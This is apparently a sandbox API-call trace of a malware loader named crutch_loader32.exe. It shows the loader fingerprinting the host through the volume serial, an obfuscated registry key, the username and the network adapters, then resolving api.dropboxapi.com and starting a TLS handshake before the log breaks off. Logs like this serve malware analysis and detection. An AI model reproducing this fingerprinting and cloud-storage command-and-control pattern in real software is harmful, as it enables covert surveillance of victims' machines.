+[PAR] LPWSTR  lpFileSystemNameBuffer   : 0x0
+[PAR] DWORD   nFileSystemNameSize      : 0x0
+[RET] 0x748e3753
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey       : 0x80000002 (HKEY_LOCAL_MACHINE)
+[PAR] LPCTSTR lpSubKey   : 0x10b3b00
+[STR]         -> "Ü/1ÏÕ @i‚*8ü]¸×›Õ™ïªÅ¥Uýt‘ê{	vi"
+[PAR] DWORD   ulOptions  : 0x0
+[PAR] REGSAM  samDesired : 0x20119 (KEY_READ | KEY_EXECUTE | KEY_WOW64_64KEY | KEY_WOW64_RES)
+[PAR] PHKEY   phkResult  : 0x2a6f61c
+[RET] 0x748e37e9
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ExpandEnvironmentStringsA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpSrc : 0x2a6f5e4
+[STR]         -> "%USERNAME%"
+[PAR] LPTSTR  lpDst : 0x0
+[PAR] DWORD   nSize : 0x0
+[RET] 0x748e3c87
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ExpandEnvironmentStringsA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpSrc : 0x2a6f5e4
+[STR]         -> "%USERNAME%"
+[PAR] LPTSTR  lpDst : 0x10ad098
+[PAR] DWORD   nSize : 0x6
+[RET] 0x748e3cbb
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[RET] 0x748e38f5
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetAdaptersInfo> in [IPHLPAPI.DLL] 
+[PAR] PIP_ADAPTER_INFO AdapterInfo : 0x2a6cd70
+[PAR] PULONG           SizePointer : 0x2a6cd6c
+[RET] 0x748e364b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <CreateFileA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName            : 0x10ce868
+[STR]         -> "C:\Users\user\AppData\Local\Temp\fdb54fe115cd1f02f056acd2311f9fef"
+[PAR] DWORD   dwDesiredAccess       : 0x10000000 (GENERIC_ALL)
+[PAR] DWORD   dwCreationDisposition : 0x3 (OPEN_EXISTING)
+[RET] 0x748e2b4e
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <SetErrorMode> in [KERNEL32.DLL] 
+[RET] 0x748e3710
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetVolumeInformationW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpRootPathName           : NULL (current directory)
+[PAR] LPWSTR  lpVolumeNameBuffer       : 0x0
+[PAR] DWORD   nVolumeNameSize          : 0x0
+[PAR] LPDWORD lpVolumeSerialNumber     : 0x2a6f6d4
+[PAR] LPDWORD lpMaximumComponentLength : 0x2a6f6c8
+[PAR] LPDWORD lpFileSystemFlags        : 0x2a6f6cc
+[PAR] LPWSTR  lpFileSystemNameBuffer   : 0x0
+[PAR] DWORD   nFileSystemNameSize      : 0x0
+[RET] 0x748e3753
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey       : 0x80000002 (HKEY_LOCAL_MACHINE)
+[PAR] LPCTSTR lpSubKey   : 0x10b3800
+[STR]         -> "Ü/1ÏÕ @i‚*8ü]¸×›Õ™ïªÅ¥Uýt‘ê{	vi"
+[PAR] DWORD   ulOptions  : 0x0
+[PAR] REGSAM  samDesired : 0x20119 (KEY_READ | KEY_EXECUTE | KEY_WOW64_64KEY | KEY_WOW64_RES)
+[PAR] PHKEY   phkResult  : 0x2a6f6dc
+[RET] 0x748e37e9
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ExpandEnvironmentStringsA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpSrc : 0x2a6f6a4
+[STR]         -> "%USERNAME%"
+[PAR] LPTSTR  lpDst : 0x0
+[PAR] DWORD   nSize : 0x0
+[RET] 0x748e3c87
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ExpandEnvironmentStringsA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpSrc : 0x2a6f6a4
+[STR]         -> "%USERNAME%"
+[PAR] LPTSTR  lpDst : 0x10ad098
+[PAR] DWORD   nSize : 0x6
+[RET] 0x748e3cbb
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[RET] 0x748e38f5
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetAdaptersInfo> in [IPHLPAPI.DLL] 
+[PAR] PIP_ADAPTER_INFO AdapterInfo : 0x2a6ce30
+[PAR] PULONG           SizePointer : 0x2a6ce2c
+[RET] 0x748e364b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <VerifyVersionInfoA> in [KERNEL32.DLL] 
+[RET] 0x748b3134
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetModuleHandleA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpModuleName : 0x74903bac ("kernel32")
+[RET] 0x748b31a0
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x74903b9c ("LoadLibraryExA")
+[RET] 0x748b31b8
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x76150000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x74903b88 ("AddDllDirectory")
+[RET] 0x748b3206
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <LoadLibraryExA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x7490244c ("secur32.dll")
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x748b3214
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x741c0000 ("secur32.dll")
+[PAR] LPCSTR  lpProcName : 0x74902434 ("InitSecurityInterfaceA")
+[RET] 0x748a15bc
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitSecurityInterfaceA> in [SspiCli.dll] 
+[RET] 0x748a15c2
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WSAStartup> in [WS2_32.dll] 
+[PAR] WORD wVersionRequested : 0x202
+[RET] 0x748a10e3
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <socket> in [WS2_32.dll] 
+[PAR] int address_family : 0x17 (AF_INET6) (IPv6)
+[PAR] int type           : 0x2 (SOCK_DGRAM)
+[PAR] int protocol       : 0x0 (NOT_SPECIFIED)
+[RET] 0x748a2085
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <closesocket> in [WS2_32.dll] 
+[PAR] SOCKET       s : 0x154
+[RET] 0x748b2480
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WinHttpGetDefaultProxyConfiguration> in [WINHTTP.dll] 
+[RET] 0x748e5f84
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WinHttpGetIEProxyConfigForCurrentUser> in [WINHTTP.dll] 
+[PAR] WINHTTP_CURRENT_USER_IE_PROXY_CONFIG *pProxyConfig : 0x2a6f7c8
+[RET] 0x748e5f8e
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <CreateThread> in [KERNEL32.DLL] 
+[PAR] LPTHREAD_START_ROUTINE lpStartAddress  : 0x748ebd66 
+[PAR] LPVOID                 lpParameter     : 0x10ee028
+[PAR] DWORD                  dwCreationFlags : 0x0
+[RET] 0x748ebc7a
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0x54]
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x4 (0 sec)
+[RET] 0x748a1890
+
+[ * ] [pid 0xa5c][tid 0x54] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+[ * ] [pid 0xa5c][tid 0x54] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCurrentPackageId> in [KERNELBASE.dll] 
+[PAR] UINT32* bufferLength : 0x46af834
+[PAR] BYTE*   buffer       : 0x0
+[RET] 0x748ee9bf
+
+[ * ] [pid 0xa5c][tid 0x54] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <getaddrinfo> in [WS2_32.dll] 
+[PAR] PCSTR      pNodeName    : 0x10ecd70
+[STR]            -> "api.dropboxapi.com"
+[PAR] PCSTR      pServiceName : 0x46af7f4
+[STR]            -> "443"
+[PAR] ADDRINFOA  *pHints      : 0x10ce890
+[PAR] PADDRINFOA *ppResult    : 0x46af7c0
+[RET] 0x748b33ae
+
+[ * ] [pid 0xa5c][tid 0x54] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <freeaddrinfo> in [WS2_32.dll] 
+[PAR] PADDRINFO     pAddrInfo : 0x10b2860
+[FLD] PADDRINFOW    pAddrInfo : 0x10b2860
+[FLD]               -> ai_flags     = 0x0 
+[FLD]               -> ai_family    = 0x2 (AF_INET) (IPv4)
+[FLD]               -> ai_socktype  = 0x1 (SOCK_STREAM)
+[FLD]               -> ai_protocol  = 0x0 (NOT_SPECIFIED)
+[FLD]               -> ai_addrlen   = 0x10
+[FLD]               -> ai_canonname = 0x0 (null)
+[FLD]               -> *ai_addr     = 0x10e3898
+[FLD]               -> *ai_next     = 0x0
+[RET] 0x748b34e0
+
+[ * ] [pid 0xa5c][tid 0x54] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <RtlExitUserThread> in [ntdll.dll] 
+[PAR] NTSTATUS ExitStatus : 0x0
+[RET] 0x748ebd0d
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetSystemTimeAsFileTime> in [KERNEL32.DLL] 
+[RET] 0x748ea60b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WaitForSingleObject> in [KERNEL32.DLL] 
+[PAR] HANDLE hHandle        : 0x19c
+[PAR] DWORD  dwMilliseconds : 0xffffffff (INFINITE)
+[RET] 0x748b4cc1
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0x19c
+[RET] 0x748b4cd1
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <socket> in [WS2_32.dll] 
+[PAR] int address_family : 0x2 (AF_INET) (IPv4)
+[PAR] int type           : 0x1 (SOCK_STREAM)
+[PAR] int protocol       : 0x0 (NOT_SPECIFIED)
+[RET] 0x748b2555
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ntohs> in [WS2_32.dll] 
+[PAR] USHORT netshort  : 0xbb01
+[RET] 0x748b2078
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x19c
+[PAR] int    level   : 0x6 (IPPROTO_TCP)
+[PAR] int    optname : 0x1 (TCP_NODELAY)
+[PAR] char   *optval : 0x2a6f4f0
+[PAR] int    optlen  : 0x4
+[RET] 0x748b2276
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <VerifyVersionInfoA> in [KERNEL32.DLL] 
+[RET] 0x748b3134
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ioctlsocket> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x19c
+[PAR] LONG   cmd  : 0x8004667e (FIONBIO)
+[PAR] PULONG argp : 0x2a6f4f4
+[FLD]        -> *argp = 0x1 (enable non-blocking mode)
+[RET] 0x748d3c82
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <connect> in [WS2_32.dll] 
+[PAR] SOCKET          s       : 0x19c
+[PAR] struct sockaddr *name   : 0x2a6f548
+[FLD]          -> sin_family   : 2 (IPv4)
+[FLD]          -> sin_port     : 47873 (Little endian : 443)
+[FLD]          -> sin_addr     : 169.254.143.46
+[PAR] int             namelen : 0x10
+[RET] 0x748b28b4
+
+Thread created by monitored process : Now monitoring [pid 0xa5c][tid 0xb20]
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WSAGetLastError> in [WS2_32.dll] 
+[RET] 0x748b28c7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x0
+[PAR]  fd_set FAR*  writefds  : 0x2a6f4e4
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2dc
+[FLD]               -> socket_0 = 0x19c
+[PAR]  timeval FAR* timeout   : 0x2a6f2c0
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x0
+[PAR]  fd_set FAR*  writefds  : 0x2a6f464
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x2a6f348
+[RET] 0x748a1f43
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f360
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f464
+[RET] 0x748a2031
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f568
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x0
+[PAR]  fd_set FAR*  writefds  : 0x2a6f4e4
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2dc
+[FLD]               -> socket_0 = 0x19c
+[PAR]  timeval FAR* timeout   : 0x2a6f2c0
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f4e4
+[RET] 0x748a1c98
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f2dc
+[RET] 0x748a1caa
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <SleepEx> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x0 (0 sec)
+[RET] 0x748b1f4d
+
+[ * ] [pid 0xa5c][tid 0xb20] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <GetCurrentThreadId> in [KERNEL32.DLL] 
+[RET] 0x748e9033
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <getsockopt> in [WS2_32.dll] 
+[PAR] SOCKET    s       : 0x19c
+[PAR] int       level   : 0xffff
+[PAR] int       optname : 0x1007
+[PAR] char FAR* optval  : 0x2a6f5f0
+[PAR] int FAR*  optlen  : 0x2a6f5f4
+[RET] 0x748b1f6c
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <getpeername> in [WS2_32.dll] 
+[PAR] SOCKET   s        : 0x19c
+[PAR] sockaddr *name    : 0x2a6f570
+[PAR] int      *namelen : 0x2a6f4e8
+[RET] 0x748b2111
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <getsockname> in [WS2_32.dll] 
+[PAR] SOCKET          s        : 0x19c
+[PAR] struct sockaddr *name    : 0x2a6f4f0
+[PAR] int             *namelen : 0x2a6f4e8
+[RET] 0x748b215e
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ntohs> in [WS2_32.dll] 
+[PAR] USHORT netshort  : 0xbb01
+[RET] 0x748b2078
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <ntohs> in [WS2_32.dll] 
+[PAR] USHORT netshort  : 0x2f04
+[RET] 0x748b2078
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <VerifyVersionInfoA> in [KERNEL32.DLL] 
+[RET] 0x748b3134
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <AcquireCredentialsHandleA> in [SspiCli.dll] 
+[PAR] LPSTR          pszPrincipal     : 0x0 (null)
+[PAR] LPSTR          pszPackage       : 0x749057fc
+[STR]                -> "Microsoft Unified Security Protocol Provider"
+[PAR] unsigned long  fCredentialUse   : 0x2 (SECPKG_CRED_OUTBOUND)
+[PAR] void*          pvLogonId        : 0x0
+[PAR] void*          pAuthData        : 0x2a6f5a4
+[FLD]                -> Type          = 4 (CredsspSchannelCreds)
+[FLD]                -> pSchannelCred = 0x0
+[FLD]                -> pSpnegoCred   = 0x0
+[PAR] SEC_GET_KEY_FN pGetKeyFn        : 0x0
+[PAR] void*          pvGetKeyArgument : 0x0
+[PAR] PCredHandle    phCredential     : 0x10eced0
+[PAR] PTimeStamp     ptsExpiry        : 0x10eced8
+[RET] 0x748b626f
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <AcquireCredentialsHandleA>
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitializeSecurityContextA> in [SspiCli.dll] 
+[PAR] PCredHandle    phCredential  : 0x10eced0
+[PAR] PCtxtHandle    phContext     : 0x0
+[PAR] CHAR*          pszTargetName : 0x10edf18
+[STR]                -> "api.dropboxapi.com"
+[PAR] unsigned long  fContextReq   : 0x811c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x0 (SECURITY_NETWORK_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x10f40f0
+[PAR] PSecBufferDesc pOutput       : 0x2a6f594
+[PAR] unsigned long* pfContextAttr : 0x10edd00
+[PAR] PTimeStamp     ptsExpiry     : 0x10f40f8
+[RET] 0x748b63c6
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x19d
+[PAR]  fd_set FAR*  readfds   : 0x2a6f2dc
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f1d8
+[FLD]               -> socket_0 = 0x19c
+[PAR]  timeval FAR* timeout   : 0x2a6f1bc
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x19c
+[PAR] char   *buf : 0x10f42d0
+[PAR] int    len  : 0xbb
+[RET] 0x748af80a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeContextBuffer> in [SspiCli.dll] 
+[PAR] PVOID pvContextBuffer : 0x10f42d0
+[RET] 0x748b645d
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x19c
+[PAR] char   *buf   : 0x10f52d8
+[PAR] int    len    : 0x1000
+[RET] 0x748aefb7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WSAGetLastError> in [WS2_32.dll] 
+[RET] 0x748aefc2
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x2a6f360
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x2a6f348
+[RET] 0x748a1f43
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f360
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f464
+[RET] 0x748a2031
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f568
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x19d
+[PAR]  fd_set FAR*  readfds   : 0x2a6f400
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2fc
+[FLD]               -> socket_0 = 0x19c
+[PAR]  timeval FAR* timeout   : 0x2a6f2e0
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f400
+[RET] 0x748a1c30
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f2fc
+[RET] 0x748a1c44
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x19c
+[PAR] char   *buf   : 0x10f52d8
+[PAR] int    len    : 0x1000
+[RET] 0x748aefb7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitializeSecurityContextA> in [SspiCli.dll] 
+[PAR] PCredHandle    phCredential  : 0x10eced0
+[PAR] PCtxtHandle    phContext     : 0x10f40f0
+[PAR] CHAR*          pszTargetName : 0x10edf18
+[STR]                -> "api.dropboxapi.com"
+[PAR] unsigned long  fContextReq   : 0x811c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x0 (SECURITY_NETWORK_DREP)
+[PAR] PSecBufferDesc pInput        : 0x2a6f5cc
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x2a6f5d8
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x561
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x10f62e0
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0
+[PAR] PSecBufferDesc pOutput       : 0x2a6f5c0
+[PAR] unsigned long* pfContextAttr : 0x10edd00
+[PAR] PTimeStamp     ptsExpiry     : 0x10f40f8
+[RET] 0x748b67c7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x19d
+[PAR]  fd_set FAR*  readfds   : 0x2a6f324
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f220
+[FLD]               -> socket_0 = 0x19c
+[PAR]  timeval FAR* timeout   : 0x2a6f204
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x19c
+[PAR] char   *buf : 0x10afa10
+[PAR] int    len  : 0xb6
+[RET] 0x748af80a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeContextBuffer> in [SspiCli.dll] 
+[PAR] PVOID pvContextBuffer : 0x10afa10
+[RET] 0x748b687d
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x2a6f360
+[FLD]               -> socket_0 = 0x19c
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x2a6f348
+[RET] 0x748a1f43
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f360
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x19c
+[PAR] fd_set set : 0x2a6f464
+[RET] 0x748a2031
+
